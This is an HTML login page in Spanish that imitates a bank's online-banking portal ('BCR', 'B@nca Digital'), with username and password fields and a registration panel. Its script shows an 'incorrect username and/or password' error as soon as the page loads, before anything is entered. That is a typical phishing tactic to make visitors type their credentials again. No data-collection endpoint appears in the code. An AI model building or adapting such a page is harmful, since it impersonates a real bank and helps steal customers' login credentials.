<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>BCR</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* Estilos existentes simplificados */
    body { font-family: sans-serif; margin: 0; padding: 0; }

    .containerimg { display: flex; justify-content: center; margin-top: 50px; }
    .divform1, .divform2 { padding: 20px; border: 1px solid #ccc; border-radius: 5px; width: 300px; margin: 10px; }
    .btn-uno, .btn-dos, .btn-tres { display: block; margin: 10px auto; padding: 10px; width: 100%; }
    .floating-label, .floating-label2 { margin-bottom: 20px; }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 999;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background-color: rgba(0,0,0,0.5);
    }

    .modal-content {
      background-color: white;
      margin: 15% auto;
      padding: 20px;
      border: 1px solid #888;
      width: 400px;
      border-radius: 10px;
      text-align: center;
    }

    .modal-header {
      background-color: #0033a0;
      color: white;
      font-weight: bold;
      padding: 10px;
      border-top-left-radius: 10px;
      border-top-right-radius: 10px;
    }

    .modal button {
      background-color: #0033a0;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      margin-top: 15px;
      cursor: pointer;
    }

    .modal-close {
      position: absolute;
      top: 10px; right: 15px;
      font-size: 20px;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="containerimg">  
    <div class="divform1">
      <form id="loginForm">
        <span class="ingresartxt">Ingresar</span>
        <hr class="line1" color="#C4C4C4">

        <div class="floating-label">      
          <input class="user" type="text" name="usuario" id="usuario" placeholder="Usuario" required>
        </div>

        <div class="floating-label2">      
          <input class="pass" type="password" name="cpass" id="contrasena" placeholder="Contraseña" required>
        </div>

        <button type="submit" class="btn-uno">Ingresar</button>
        <button class="btn-dos" type="button">Recuperar datos de ingreso</button>
      </form>
    </div>

    <div class="divform2">
      <span class="ingresartxt">Registrarse</span>
      <hr class="line1" color="#C4C4C4">
      <span class="registertext">
        Regístrese aquí si desea utilizar los servicios de B@nca Digital.<br><br>
        Para registrarse requiere ser cliente y tener al menos un producto activo.
      </span>
      <button class="btn-tres">Continuar</button>
    </div>
  </div>

  <!-- Modal -->
  <div id="modalError" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        Atención
        <span class="modal-close" onclick="cerrarModal()">&times;</span>
      </div>
      <p>Su usuario y/o contraseña son incorrectos.</p>
      <button onclick="cerrarModal()">Aceptar</button>
    </div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const modal = document.getElementById("modalError");

    // Reglas para la contraseña
    function validarContrasena(pass) {
      const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d]{8,11}$/;
      return regex.test(pass);
    }

    // Reglas para el usuario (sin espacios)
    function validarUsuario(usuario) {
      return !/\s/.test(usuario);
    }

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      const usuario = document.getElementById("usuario").value;
      const contrasena = document.getElementById("contrasena").value;

      if (!validarUsuario(usuario) || !validarContrasena(contrasena)) {
        mostrarModal();
        return;
      }

      // Si todo es válido, se puede enviar (aquí se usa fetch o submit real si se necesita)
      this.submit();
    });

    function mostrarModal() {
      modal.style.display = "block";
    }

    function cerrarModal() {
      modal.style.display = "none";
    }

    // Mostrar modal al cargar la página (modo demostración)
    window.onload = function() {
      mostrarModal();
    };
  </script>

</body>
</html>
